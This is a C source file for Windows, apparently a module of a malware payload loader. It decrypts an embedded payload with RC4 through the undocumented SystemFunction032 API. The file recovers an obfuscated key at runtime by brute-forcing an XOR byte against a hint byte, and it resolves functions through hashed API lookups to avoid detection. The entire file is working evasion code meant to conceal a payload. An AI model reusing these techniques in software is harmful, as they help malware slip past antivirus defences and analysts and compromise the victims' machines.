#include <Windows.h>
#include "Common.h"
#include "Debug.h"

BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

	// The return of SystemFunction032
	NTSTATUS        	STATUS = NULL;
	BYTE			RealKey[KEY_SIZE] = { 0 };
	INT			    b = 0;

	// Brute forcing the key:
	while (1) {
		// Using the hint byte, if this is equal, then we found the 'b' value needed to decrypt the key
		if (((pRc4Key[0] ^ b) - 0) == HINT_BYTE)
			break;
		// Else, increment 'b' and try again
		else
			b++;
	}

#ifdef DEBUG
	PRINTA("[i] Calculated 'b' to be : 0x%0.2X \n", b);
#endif

	// Decrypting the key
	for (INT i = 0; i < KEY_SIZE; i++) {
		RealKey[i] = (BYTE)((pRc4Key[i] ^ b) - i);
	}

	// Making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
	USTRING         Key = { .Buffer = RealKey,              .Length = dwRc4KeySize,         .MaximumLength = dwRc4KeySize },
		Img = { .Buffer = pPayloadData,         .Length = sPayloadSize,         .MaximumLength = sPayloadSize };

	// Since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the process,
	// And using its return as the hModule parameter in GetProcAddress
	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddressH(LoadLibraryH("Advapi32"), SystemFunction032_CRC32);

	// If SystemFunction032 calls failed it will return non zero value
	if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
#ifdef DEBUG
		PRINTA("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
#endif
		return FALSE;
	}

	return TRUE;
}